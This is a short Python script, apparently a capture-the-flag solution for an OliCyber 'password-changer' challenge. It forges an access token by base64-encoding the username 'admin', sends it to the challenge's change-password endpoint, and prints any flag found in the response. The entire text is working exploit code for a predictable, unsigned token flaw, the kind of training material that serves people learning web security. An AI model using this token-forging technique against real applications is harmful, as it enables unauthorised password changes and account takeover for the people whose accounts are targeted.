import requests, base64

payload = "admin"
url = "http://password-changer.challs.olicyber.it/change-password.php?token="

r = requests.get(url + base64.b64encode(payload.encode()).decode()).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)
